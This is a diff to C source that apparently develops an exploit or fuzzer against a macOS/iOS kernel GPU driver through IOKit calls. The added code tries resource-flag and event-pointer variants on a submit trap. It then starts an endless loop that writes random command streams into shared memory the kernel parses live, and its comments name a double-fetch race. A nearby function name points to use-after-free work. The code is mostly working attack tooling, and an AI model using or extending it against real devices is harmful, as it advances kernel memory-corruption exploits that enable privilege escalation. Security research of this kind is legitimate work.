@@ -2415,9 +2415,9 @@ static void p_submit2(void) {
 
     // notification queue: try a few count values
     uint64_t nqid = 0;
-    static const uint64_t cnts[] = { 0x4000, 0x100, 0x1000, 0x40, 0x400, 1 };
+    static const uint64_t cnts[] = { 0x100, 0x1000, 0x4000, 0x40 };
     for (unsigned i = 0; i < sizeof(cnts)/8 && !nqid; i++) {
-        uint64_t a[2] = { cnts[i], 0 };
+        uint64_t a[2] = { cnts[i], 0x10 };   // sc[1] = entrySize (was 0 -> invalid)
         memset(out, 0, 0x1000);
         size_t osz = 0x10; nosc = 0;
         kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &osz);
@@ -2447,22 +2447,94 @@ static void p_submit2(void) {
     uint32_t ridB = gpu_resource(c, bufB, 0x4000);
     if (!ridA || !ridB) return;
 
-    // trap0 submit
+    // trap0 submit — entry variants (+0x10/+0x18 = event/descriptor pointers)
     uint8_t *entry = must_map(0x1000);
-    memset(bufB, 0, 0x4000);
-    *(uint32_t *)(bufB + 0xc) = 0x80000000;
-    memset(entry, 0, 0x1000);
-    *(uint32_t *)(entry + 0x00) = ridA;
-    *(uint32_t *)(entry + 0x04) = ridB;
+    uint8_t *evbuf = must_map(0x1000);
+    memset(evbuf, 0, 0x1000);
     uint32_t *outw = (uint32_t *)must_map(0x100);
-    *outw = 0xdeadbeef;
-    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
-    LOG("[s2] trap0 submit -> kr 0x%08x outw %08x", kt, *outw);
+    static const struct { int p10, p18; const char *n; } ev[] = {
+        { 0, 0, "null-ptrs" },
+        { 1, 1, "both-valid" },
+        { 0, 1, "only-18" },
+        { 1, 0, "only-10" },
+    };
+    // resource B flag variants: +0x16 bit1 (extra/kernel mapping), etc.
+    static const uint8_t bflags[][2] = { {0,0}, {0,2}, {0,6}, {0,4}, {0x40,2}, {0,3} };
+    for (unsigned f = 0; f < sizeof(bflags)/2; f++) {
+        uint8_t *bufC = must_map(0x4000);
+        memset(bufC, 0, 0x4000);
+        uint8_t *in2 = must_map(0x1000);
+        uint8_t *out2 = must_map(0x1000);
+        memset(in2, 0, 0x1000); memset(out2, 0, 0x1000);
+        *(uint32_t *)(in2 + 0x00) = 0x80;
+        *(uint32_t *)(in2 + 0x30) = 1;
+        in2[0x14] = bflags[f][0];
+        in2[0x16] = bflags[f][1];
+        *(uint64_t *)(in2 + 0x38) = (uint64_t)(uintptr_t)bufC + 0x4000;
+        *(uint64_t *)(in2 + 0x40) = (uint64_t)(uintptr_t)bufC;
+        *(uint64_t *)(in2 + 0x48) = 0x4000;
+        size_t osz2 = 0x58;
+        uint64_t osc2[4] = {0,0,0,0}; uint32_t nosc2 = 0;
+        kern_return_t k9 = IOConnectCallMethod(c, 8, NULL, 0, in2, 0x68, osc2, &nosc2, out2, &osz2);
+        uint32_t ridC = *(uint32_t *)(out2 + 0x24);
+        if (k9 || !ridC) { LOG("[s2] resB f14 %02x f16 %02x create kr 0x%08x", bflags[f][0], bflags[f][1], k9); continue; }
+        *(uint32_t *)(bufC + 0xc) = 0x80000000;
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = ridA;
+        *(uint32_t *)(entry + 0x04) = ridC;
+        *outw = 0xdeadbeef;
+        kern_return_t k8 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        LOG("[s2] resB f14 %02x f16 %02x rid %u -> trap0 kr 0x%08x outw %08x",
+            bflags[f][0], bflags[f][1], ridC, k8, *outw);
+        usleep(100000);
+    }
+    kern_return_t kt = 0;
+    for (unsigned i = 0; i < sizeof(ev)/sizeof(ev[0]); i++) {
+        memset(bufB, 0, 0x4000);
+        *(uint32_t *)(bufB + 0xc) = 0x80000000;
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = ridA;
+        *(uint32_t *)(entry + 0x04) = ridB;
+        if (ev[i].p10) *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)evbuf;
+        if (ev[i].p18) *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(evbuf + 0x100);
+        *outw = 0xdeadbeef;
+        kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        LOG("[s2] trap0 %s -> kr 0x%08x outw %08x", ev[i].n, kt, *outw);
+        usleep(100000);
+    }
     // sel25 too
     g_qid = qid;
     kr = gpu_submit(entry);
     LOG("[s2] sel25 submit -> kr 0x%08x", kr);
     LOG("[v52] done (alive)");
+
+    // V53: if the submit path opened, fuzz the command stream (resource B is
+    // user-writable shmem parsed live by the kernel). Mutator thread = double-fetch.
+    if (kt == 0 || kr == 0) {
+        LOG("[v53] submit path open — fuzzing command stream");
+        // inline mutation + submit loop
+        for (long r = 0;; r++) {
+            // random command stream: 1-8 commands with typed headers
+            int ncmd = 1 + frand() % 8;
+            int off = 0;
+            for (int c2 = 0; c2 < ncmd && off < 0x3f0; c2++) {
+                uint32_t type = frand() % 8;
+                uint32_t hdr = (frand() & 1) ? (0x80000000 | type) : type;
+                if (frand() & 1) hdr |= 0x40000000;      // modifier bit
+                *(uint32_t *)(bufB + off + 0xc) = hdr;
+                // body: semi-structured (shmemOffset-ish fields)
+                int bodyw = frand() % 6;
+                for (int w = 0; w < bodyw; w++)
+                    *(uint32_t *)(bufB + off + w * 4) = (frand() & 3) ? (uint32_t)frand() : (uint32_t)(frand() % 0x1000);
+                off += 0x10 + (frand() % 4) * 0x10;
+            }
+            *(uint32_t *)(bufB + 0xffc) = 0x80000000;    // trailing end marker
+            kern_return_t k2 = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+            if (k2 != 0 && k2 != 0xe00002bc && k2 != 0xe00002c2 && (r & 0x3f) == 0)
+                LOG("[v53] r%ld kr 0x%08x outw %08x", r, k2, *outw);
+            if ((r & 0x1ff) == 0) usleep(1000);
+        }
+    }
 }
 
 static void p4b_uaf2(void) {
